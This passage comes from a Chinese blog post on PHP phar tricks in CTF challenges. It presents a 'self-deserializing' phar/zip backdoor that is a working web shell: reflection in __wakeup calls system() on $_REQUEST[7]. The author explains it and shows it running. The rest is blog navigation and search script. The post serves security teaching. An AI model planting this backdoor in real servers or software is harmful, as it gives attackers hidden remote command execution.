<p>这个比较有点 <code>ctf</code> 的味道了，依靠的是 <code>phar</code> 文件的格式多样性和 <code>反序列化</code> 进行，比如以下代码(文件)👇</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PK     q;T              a PK      q;T                      €    aPK      /   !   ?O:<span class="number">7</span>:<span class="string">&quot;payload&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;x&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;system&quot;</span>;&#125;<span class="meta">&lt;?php</span> <span class="class"><span class="keyword">class</span> <span class="title">bypass</span></span>&#123;<span class="built_in">static</span> <span class="variable">$v</span>=[];&#125;<span class="class"><span class="keyword">class</span> <span class="title">payload</span></span>&#123;<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;(<span class="keyword">new</span> ReflectionClass(<span class="string">&#x27;bypass&#x27;</span>))-&gt;setStaticPropertyValue(<span class="string">&#x27;v&#x27;</span>,<span class="keyword">$this</span>-&gt;x);(bypass::<span class="variable">$v</span>)(<span class="variable">$_REQUEST</span>[<span class="number">7</span>]);&#125;&#125;dir(<span class="string">&#x27;phar://&#x27;</span>.<span class="keyword">__FILE__</span>.<span class="string">&#x27;/a&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>其中里面的 <code>php</code> 代码如下👇</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bypass</span></span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$v</span>=[];</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        (<span class="keyword">new</span> ReflectionClass(<span class="string">&#x27;bypass&#x27;</span>))-&gt;setStaticPropertyValue(<span class="string">&#x27;v&#x27;</span>,<span class="keyword">$this</span>-&gt;x);</span><br><span class="line">        (bypass::<span class="variable">$v</span>)(<span class="variable">$_REQUEST</span>[<span class="number">7</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">dir(<span class="string">&#x27;phar://&#x27;</span>.<span class="keyword">__FILE__</span>.<span class="string">&#x27;/a&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>简单来说在 <code>wakeup</code> 的时候通过反射将 <code>bypass</code> 类静态属性 <code>$v</code> 的值设为了 <code>payload</code> 类属性 <code>x</code> 的值，然后进行动态调用；而这里将 <code>payload</code> 类属性 <code>x</code> 的值先设为 <code>system</code> ，然后通过 <code>phar</code> 连同 <code>php</code> 代码打包成了 <code>zip</code> 内容，这样在执行时候就相当于通过 <code>自我反序列化</code> 进行动态调用。</p>
<p>比如进行执行👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201271418621.png" alt="image-20220127141824512"></p>
<p>可见是成功执行了命令。</p>
<h2 id="总结">- 总结 -</h2>
<p>总之呢，这个 <code>phar</code> 还是非常有趣的，如果按照原本的设定好好利用，比如通过 <code>phar</code> 将多个代码文件包装的方式写框架是能够很好的节省空间的，不过如果单纯着就想揪着 <code>phar</code> 有关 <code>反序列化</code> 功能来利用，确实也会是别有一番天地。当然，有关 <code>phar</code> 的利用肯定还不止这些，只能说继续向前吧。</p>


        <hr>
        <!-- Pager -->
        <ul class="pager">
          
          
          <li class="next">
            <a href="/posts/1286047278/" data-toggle="tooltip" data-placement="top" title="漏洞挖掘 - SEMCMS1.5">Next Post &rarr;</a>
          </li>
          
        </ul>

        
        <!-- tip start -->
        <!-- tip -->
<!-- tip start -->
<div class="tip">
  <p>
    
      如果您喜欢此博客或发现它对您有用，则欢迎对此发表评论。也欢迎您共享此博客，以便更多人可以参与。如果博客中使用的图像侵犯了您的版权，请与作者联系以将其删除。谢谢 ！
    
  </p>
</div>
<!-- tip end -->

        <!-- tip end -->
        

        
        <!-- Sharing Srtart -->
        <!-- Social Social Share Post -->
<!-- Docs:https://github.com/overtrue/share.js -->

<div class="social-share" data-initialized="true" data-disabled="tencent ,douban ,qzone ,linkedin ,facebook ,google ,diandian" data-wechat-qrcode-helper="" align="center">
  <ul class="list-inline text-center social-share-ul">
    <li class="social-share-li">
      <a target="_blank" class="social-share-icon icon-twitter">
        <i class="fa fa-twitter fa-1x" aria-hidden="true"></i>
      </a>
    </li>
    <li class="social-share-li">
      <a class="social-share-icon icon-wechat">
        <i class="fa fa-weixin fa-1x" aria-hidden="true"></i>
      </a>
    </li>
    <li class="social-share-li">
      <a target="_blank" class="social-share-icon icon-weibo">
        <i class="fa fa-weibo fa-1x" aria-hidden="true"></i>
      </a>
    </li>
    <li class="social-share-li">
      <a target="_blank" class="social-share-icon icon-qq">
        <i class="fa fa-qq fa-1x" aria-hidden="true"></i>
      </a>
    </li>
    <li class="social-share-li">
      <a target="_blank" class="social-share-icon" href="mailto:?subject=总结 - ctf中php的phar(一)&body=Hi,I found this website and thought you might like it https://morblog.cc/posts/2586386993/">
        <i class="fa fa-envelope fa-1x" aria-hidden="true"></i>
      </a>
    </li>
  </ul>
</div>

<!-- css & js -->
<!-- <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css"> -->
<script defer="defer" async="true" src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>

        <!-- Sharing End -->
        
        <hr>

        <!-- comments start -->
        <!-- 1. gitalk comment -->


<!-- 2. gitment comment -->


<!-- 4. disqus comment -->

  <!-- disqus comment start -->

  <div class="comment">
    <div id="disqus_thread" class="disqus-thread"></div>
  </div>

  <!-- disqus embedded js code start (one page only need to embed once) -->
  <script type="text/javascript">
    /* * * CONFIGURATION VARIABLES * * */
    var disqus_shortname = "moryyds-1";
    var disqus_identifier = "https://morblog.cc/posts/2586386993/";
    var disqus_url = "https://morblog.cc/posts/2586386993/";

    (function () {
      var dsq = document.createElement('script');
      dsq.type = 'text/javascript';
      dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
  </script>
  <!-- disqus embedded js code start end -->

  <!-- disqus comment end -->


        <!-- comments end -->
        <hr>

      </div>

      <!-- Catalog: Tabe of Content -->
      <!-- Table of Contents -->

    
      <aside id="sidebar">
        <div id="toc" class="toc-article">
        <strong class="toc-title">目录</strong>
        
          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">总结 - ctf中php的phar(一)</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">- 前言 -</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#phar"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">- phar -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E7%BB%93%E6%9E%84"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">- 结构 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#stub"><span class="toc-nav-number">1.2.1.1.</span> <span class="toc-nav-text">- stub -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#manifest"><span class="toc-nav-number">1.2.1.2.</span> <span class="toc-nav-text">- manifest -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#content"><span class="toc-nav-number">1.2.1.3.</span> <span class="toc-nav-text">- content -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#signature"><span class="toc-nav-number">1.2.1.4.</span> <span class="toc-nav-text">- signature -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90"><span class="toc-nav-number">1.2.2.</span> <span class="toc-nav-text">- 文件解析 -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E5%9B%A0"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">- 反序列化原因 -</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%89%A9%E5%B1%95"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">- 扩展 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%88%86%E6%9E%90"><span class="toc-nav-number">1.4.1.</span> <span class="toc-nav-text">- 分析 -</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%A0%BC%E5%BC%8F"><span class="toc-nav-number">1.4.2.</span> <span class="toc-nav-text">- 格式 -</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-nav-number">1.4.3.</span> <span class="toc-nav-text">- 例子 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%84%8F%E5%AD%97%E7%AC%A6-%E5%86%85%E5%AE%B9"><span class="toc-nav-number">1.4.3.1.</span> <span class="toc-nav-text">- [脏字符]+[内容] -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%86%85%E5%AE%B9-%E8%84%8F%E5%AD%97%E7%AC%A6"><span class="toc-nav-number">1.4.3.2.</span> <span class="toc-nav-text">- [内容]+[脏字符] -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%84%8F%E5%AD%97%E7%AC%A6-%E5%86%85%E5%AE%B9-%E8%84%8F%E5%AD%97%E7%AC%A6"><span class="toc-nav-number">1.4.3.3.</span> <span class="toc-nav-text">- [脏字符]+[内容]+[脏字符] -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E4%BB%A3%E7%A0%81%E5%8C%85%E8%A3%85"><span class="toc-nav-number">1.4.4.</span> <span class="toc-nav-text">- 代码包装 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#gz-bz2"><span class="toc-nav-number">1.4.4.1.</span> <span class="toc-nav-text">- gz&#x2F;bz2 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#tar"><span class="toc-nav-number">1.4.4.2.</span> <span class="toc-nav-text">- tar -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#zip"><span class="toc-nav-number">1.4.4.3.</span> <span class="toc-nav-text">- zip -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%8C%85%E8%A3%85"><span class="toc-nav-number">1.4.4.4.</span> <span class="toc-nav-text">- 包装 -</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E5%87%BD%E6%95%B0"><span class="toc-nav-number">1.5.</span> <span class="toc-nav-text">- 影响函数 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%88%86%E6%9E%90-2"><span class="toc-nav-number">1.5.1.</span> <span class="toc-nav-text">- 分析 -</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E7%BB%93%E8%AE%BA"><span class="toc-nav-number">1.5.2.</span> <span class="toc-nav-text">- 结论 -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-nav-number">1.6.</span> <span class="toc-nav-text">- 反序列化 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%8D%8F%E8%AE%AE%E5%B5%8C%E5%A5%97"><span class="toc-nav-number">1.6.1.</span> <span class="toc-nav-text">- 协议嵌套 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#php-filter"><span class="toc-nav-number">1.6.1.1.</span> <span class="toc-nav-text">- php:&#x2F;&#x2F;filter -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#compress-zlib"><span class="toc-nav-number">1.6.1.2.</span> <span class="toc-nav-text">- compress.zlib:&#x2F;&#x2F; -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#compress-bzip2"><span class="toc-nav-number">1.6.1.3.</span> <span class="toc-nav-text">- compress.bzip2:&#x2F;&#x2F; -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E6%BC%94%E7%A4%BA"><span class="toc-nav-number">1.6.1.4.</span> <span class="toc-nav-text">- 演示 -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#SQL"><span class="toc-nav-number">1.6.2.</span> <span class="toc-nav-text">- SQL -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#load-data-local-infile"><span class="toc-nav-number">1.6.2.1.</span> <span class="toc-nav-text">- load data local infile -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#sha256-auth"><span class="toc-nav-number">1.6.2.2.</span> <span class="toc-nav-text">- sha256 auth -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#pdo"><span class="toc-nav-number">1.6.2.3.</span> <span class="toc-nav-text">- pdo -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#XXE"><span class="toc-nav-number">1.6.3.</span> <span class="toc-nav-text">- XXE -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%90%8E%E9%97%A8"><span class="toc-nav-number">1.7.</span> <span class="toc-nav-text">- 后门 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E8%97%8F%E6%95%B0%E6%8D%AE"><span class="toc-nav-number">1.7.1.</span> <span class="toc-nav-text">- 藏数据 -</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E8%87%AA%E8%BA%AB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-nav-number">1.7.2.</span> <span class="toc-nav-text">- 自身反序列化 -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-nav-number">1.8.</span> <span class="toc-nav-text">- 总结 -</span></a></li></ol></li></ol>
        
        </div>
      </aside>
    



      <!-- Sidebar Container -->
      <div class="
                col-lg-8 col-lg-offset-1
                col-md-10 col-md-offset-1
                sidebar-container">

        <!-- Featured Tags -->
        
        <section>
          <!-- no hr -->
          <h5>
            <a href="/tags/">标签</a>
          </h5>
          <div class="tags">
            
            <a class="tag" href="/tags/#安全" title="安全">安全</a>
            
            <a class="tag" href="/tags/#PHP" title="PHP">PHP</a>
            
            <a class="tag" href="/tags/#漏洞" title="漏洞">漏洞</a>
            
          </div>
        </section>
        

        <!-- Friends Blog -->
        
        <hr>
        <h5>朋友们</h5>
        <ul class="list-inline">

          
          <li>
            <a href="https://www.cnblogs.com/Yhck/" target="_blank">Yhck</a>
          </li>
          
          <li>
            <a href="https://www.cnblogs.com/wkzb/" target="_blank">beiwo</a>
          </li>
          
          <li>
            <a href="https://leohearts.com/" target="_blank">Leohearts</a>
          </li>
          
          <li>
            <a href="https://longlone.top/" target="_blank">Longlone</a>
          </li>
          
          <li>
            <a href="http://na0hblog.top/" target="_blank">Na0h</a>
          </li>
          
        </ul>
        
      </div>
    </div>
  </div>
</article>



<!-- anchorjs start -->
<!-- async load function -->
<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
<script type="text/javascript">
  // async load function
  function async (u, c) {
    var d = document,
      t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0];
    o.src = u;
    if (c) {
      o.addEventListener('load', function(e) {
        c(null, e);
      }, false);
    }
    s.parentNode.insertBefore(o, s);
  };
</script>
<script type="text/javascript">
  //anchor-js, Doc:http://bryanbraun.github.io/anchorjs/
  async ("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js", function() {
    anchors.options = {
      visible: 'hover',
      placement: 'left',
      // icon: 'ℬ'
      icon: '❡'
    };
    anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
  });
</script>
<style>
  /* place left on bigger screen */
  @media all and (min-width: 800px) {
    .anchorjs-link {
      position: absolute;
      left: -0.75em;
      font-size: 1.1em;
      margin-top: -0.1em;
    }
  }
</style>

<!-- anchorjs end -->



		<!-- Footer (contains ThemeColor、viewer) -->
		<!-- Footer -->
<footer>
  <div class="container">
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <ul class="list-inline text-center">
          

          
            <li>
              <a target="_blank" href="https://github.com/Morouu">
                <span class="fa-stack fa-lg">
                  <i class="fa fa-circle fa-stack-2x"></i>
                  <i class="fa fa-github fa-stack-1x fa-inverse"></i>
                </span>
              </a>
            </li>
          

          

          

          

          

          

          

        </ul>
        <p class="copyright text-muted">
         &copy; 2022
		 <i class="icon-smile"></i>
          morouu
          <br>
          Theme by
          <a target="_blank" rel="noopener" href="http://beantech.org">BeanTech</a>
          <span style="display: inline-block; margin: 0 5px;">
            <i class="fa fa-heart"></i>
          </span>
          re-Ported by
          <a target="_blank" rel="noopener" href="https://v-vincen.life/">Live My Life</a>
          |
          <iframe style="margin-left: 2px; margin-bottom:-5px;" frameborder="0" scrolling="0" width="91px" height="20px" src="https://ghbtns.com/github-btn.html?user=V-Vincen&repo=V-Vincen.github.io&type=star&count=true"></iframe>
        <div class=" copyright text-muted live_time"><span>本博客已萌萌哒地运行</span><span id="display_live_time"> 0 天 0 小时 0 分 0 秒</span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
  setTimeout(blog_live_time, 1000);
  const start = new Date('2021-12-27T20:23:15');
  const now = new Date();
  const timeDiff = (now.getTime() - start.getTime());
  const msPerMinute = 60 * 1000;
  const msPerHour = 60 * msPerMinute;
  const msPerDay = 24 * msPerHour;
  const passDay = Math.floor(timeDiff / msPerDay);
  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
  display_live_time.innerHTML = " " + passDay + " 天 " + passHour + " 小时 " + passMinute + " 分 " + passSecond + " 秒";
}
blog_live_time();
</script></div>
		</p>
		
      </div>
    </div>
  </div>
</footer>

<a id="rocket" href="#top" class=""></a>


  <!-- jQuery -->
  <script type="text/javascript" src="/js/jquery.min.js"></script>
  <!-- Bootstrap Core JavaScript -->
  <script type="text/javascript" src="/js/bootstrap.min.js"></script>
  <!-- Custom Theme JavaScript -->
  <script type="text/javascript" src="/js/hux-blog.min.js"></script>
  <!-- catalog -->
  <script async="true" type="text/javascript" src="/js/catalog.js"></script>
  <!-- totop(rocket) -->
  <script async="true" type="text/javascript" src="/js/totop.js"></script>

  
    <!-- Busuanzi JavaScript -->
    <script async="async" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  

  
    <!-- Scroll start -->
    <script async="async" type="text/javascript" src="/js/scroll.js"></script>
    <!-- Scroll end -->
  

  
    <!-- LangSelect start -->
    <script type="text/javascript" src="/js/langselect.js"></script>
    <!-- LangSelect end -->
  

  
    <!-- Mouseclick -->
    <script type="text/javascript" src="/js/mouseclick.js" content='' color=''></script>
  

  
    <!-- ribbon -->
    <script type="text/javascript" src="/js/ribbonDynamic.js"></script>
  

  
    <!-- Line start -->
    <script async="text/javascript" src="/js/line.js"></script>
    <!-- Line end -->
  






  <!-- viewer start -->
  <!-- viewer start (Picture preview) -->
  
    <script async="async" type="text/javascript" src="/js/viewer/viewer.min.js"></script>
    <script async="async" type="text/javascript" src="/js/viewer/pic-viewer.js"></script>
  

  <!-- viewer end -->


<script>
  // async load function
  function async (u, c) {
    var d = document,
      t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0];
    o.src = u;
    if (c) {
      o.addEventListener('load', function (e) {
        c(null, e);
      }, false);
    }
    s.parentNode.insertBefore(o, s);
  }

  // fastClick.js
  async ("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function () {
    var $nav = document.querySelector("nav");
    if ($nav)
      FastClick.attach($nav);
    }
  )
</script>

<!-- Because of the native support for backtick-style fenced code blocks right within the Markdown is landed in Github Pages, From V1.6, There is no need for Highlight.js, so Huxblog drops it officially. -
https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0 - https://help.github.com/articles/creating-and-highlighting-code-blocks/ -->
<!-- <script> async ("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function () { hljs.initHighlightingOnLoad(); }) </script> <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet"> -->

<!-- jquery.tagcloud.js -->
<!-- <script> // only load tagcloud.js in tag.html if ($('#tag_cloud').length !== 0) { async ("https://morblog.cc/js/jquery.tagcloud.js", function () { $.fn.tagcloud.defaults = { // size: { start: 1, end: 1, unit: 'em' }, color: {
start: '#bbbbee', end: '#0085a1' } }; $('#tag_cloud a').tagcloud(); }) } </script> -->


		<!-- Search -->
		
		<div class="popup search-popup local-search-popup">
  <span class="popup-btn-close">
    ESC
  </span>
  <div class="container">
    <div class="row">
      <!-- <div class="col-md-9 col-md-offset-1"> -->
      <div class="col-lg-9 col-lg-offset-1 col-md-10 col-md-offset-1 local-search-content">

        <div class="local-search-header clearfix">

          <div class="local-search-input-wrapper">
            <span class="search-icon">
              <i class="fa fa-search fa-lg" style="margin: 25px 10px 25px 20px;"></i>
            </span>
            <input autocomplete="off" placeholder="搜索..." type="text" id="local-search-input">
          </div>
        </div>
        <div id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>


  
    <script src="/js/ziploader.js"></script>
  
  <script>
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.json";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    // monitor main search box;
    var onPopupClose = function (e) {
      $('.popup').fadeOut(300);
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $('.popup').fadeIn(300);
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }
    // get search zip version
    $.get('/searchVersion.json?t=' + (+new Date()), function (res) {
      if (localStorage.getItem('searchVersion') !== res) {
        localStorage.setItem('searchVersion', res);
        initSearchJson();
      }
    });

    function initSearchJson() {
      initLoad(['/search.flv'], {
        loadOptions: {
          success: function (obj) {
            localStorage.setItem('searchJson', obj['search.json'])
          },
          error: function (e) {
            return console.log(e)
          }
        },
        returnOptions: {
          'json': TYPE_TEXT
        },
        mimeOptions: {
          'json': 'application/json'
        }
      })
    }
    // search function;
    var searchFunc = function (search_id, content_id) {
      'use strict';
      isfetched = true;
      var datas = JSON.parse(localStorage.getItem('searchJson'));
      // console.log(search_id)
      var input = document.getElementById(search_id);
      var resultContent = document.getElementById(content_id);
      var inputEventFunction = function () {
        var searchText = input.value.trim().toLowerCase();
        var keywords = searchText.split(/[\s\-]+/);
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        var resultItems = [];
        if (searchText.length > 0) {
          // perform local searching
          datas.forEach(function (data) {
            var isMatch = false;
            var hitCount = 0;
            var searchTextCount = 0;
            var title = data.title
              ? data.title.trim()
              : '';
            var titleInLowerCase = title.toLowerCase();
            var content = data.content
              ? data.content.trim().replace(/<[^>]+>/g, "")
              : '';
            var contentInLowerCase = content.toLowerCase();
            var articleUrl = decodeURIComponent(data.url);

            var date = data.date;
            var dateTime = date.replace(/T/, " ").replace(/.000Z/, "");
            var imgUrl = data.header_img;
            


            var indexOfTitle = [];
            var indexOfContent = [];
            // only match articles with not empty titles
            keywords.forEach(function (keyword) {
              function getIndexByWord(word, text, caseSensitive) {
                var wordLen = word.length;
                if (wordLen === 0) {
                  return [];
                }
                var startPosition = 0,
                  position = [],
                  index = [];
                if (!caseSensitive) {
                  text = text.toLowerCase();
                  word = word.toLowerCase();
                }
                while ((position = text.indexOf(word, startPosition)) > -1) {
                  index.push({position: position, word: word});
                  startPosition = position + wordLen;
                }
                return index;
              }
              indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
              indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
            });
            if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
              isMatch = true;
              hitCount = indexOfTitle.length + indexOfContent.length;
            }
            // show search results
            if (isMatch) {
              // sort index by position of keyword
              [indexOfTitle, indexOfContent].forEach(function (index) {
                index.sort(function (itemLeft, itemRight) {
                  if (itemRight.position !== itemLeft.position) {
                    return itemRight.position - itemLeft.position;
                  } else {
                    return itemLeft.word.length - itemRight.word.length;
                  }
                });
              });
              // merge hits into slices
              function mergeIntoSlice(text, start, end, index) {
                var item = index[index.length - 1];
                var position = item.position;
                var word = item.word;
                var hits = [];
                var searchTextCountInSlice = 0;
                while (position + word.length <= end && index.length != 0) {
                  if (word === searchText) {
                    searchTextCountInSlice++;
                  }
                  hits.push({position: position, length: word.length});
                  var wordEnd = position + word.length;
                  // move to next position of hit
                  index.pop();
                  while (index.length != 0) {
                    item = index[index.length - 1];
                    position = item.position;
                    word = item.word;
                    if (wordEnd > position) {
                      index.pop();
                    } else {
                      break;
                    }
                  }
                }
                searchTextCount += searchTextCountInSlice;
                return {hits: hits, start: start, end: end, searchTextCount: searchTextCountInSlice};
              }
              var slicesOfTitle = [];
              if (indexOfTitle.length != 0) {
                slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
              }
              var slicesOfContent = [];
              while (indexOfContent.length != 0) {
                var item = indexOfContent[indexOfContent.length - 1];
                var position = item.position;
                var word = item.word;
                // cut out 100 characters
                var start = position - 20;
                var end = position + 80;
                if (start < 0) {
                  start = 0;
                }
                if (end < position + word.length) {
                  end = position + word.length;
                }
                if (end > content.length) {
                  end = content.length;
                }
                slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
              }
              // sort slices in content by search text's count and hits' count
              slicesOfContent.sort(function (sliceLeft, sliceRight) {
                if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                  return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                  return sliceRight.hits.length - sliceLeft.hits.length;
                } else {
                  return sliceLeft.start - sliceRight.start;
                }
              });
              // select top N slices in content
              var upperBound = parseInt('1');
              if (upperBound >= 0) {
                slicesOfContent = slicesOfContent.slice(0, upperBound);
              }
              // highlight title and content
              function highlightKeyword(text, slice) {
                var result = '';
                var prevEnd = slice.start;
                slice.hits.forEach(function (hit) {
                  result += text.substring(prevEnd, hit.position);
                  var end = hit.position + hit.length;
                  result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                  prevEnd = end;
                });
                result += text.substring(prevEnd, slice.end);
                return result;
              }
              var resultItem = '';

              // if (slicesOfTitle.length != 0) {   resultItem += "<li><a target='_blank' href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>"; } else {   resultItem += "<li><a target='_blank' href='" +
              // articleUrl + "' class='search-result-title'>" + title + "</a>"; } slicesOfContent.forEach(function (slice) {   resultItem += "<a target='_blank' href='" + articleUrl + "'><p class=\"search-result\">" + highlightKeyword(content, slice) +
              // "...</p></a>"; }); resultItem += "</li>";

              if (slicesOfTitle.length != 0) {
                resultItem += "<a target='_blank' href='" + articleUrl + "' class='search-result'><div class='search-result-left'><div class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</div><time class='search-result-date'>" + dateTime + "</time>";
              } else {
                resultItem += "<a target='_blank' href='" + articleUrl + "' class='search-result'><div class='search-result-left'><div class='search-result-title'>" + title + "</div><time class='search-result-date'>" + dateTime + "</time>";
              }
              slicesOfContent.forEach(function (slice) {
                resultItem += "<p class=\"search-result-content\">" + highlightKeyword(content, slice) + "...</p>";
              });
              resultItem += "</div><div class='search-result-right'><img class='media-image' src='" + imgUrl + "' width='64px' height='48px'></img></div></a>";

              resultItems.push({item: resultItem, searchTextCount: searchTextCount, hitCount: hitCount, id: resultItems.length});
            }
          })
        };

        if (keywords.length === 1 && keywords[0] === "") {
          resultContent.innerHTML = '<div id="no-result"></div>'
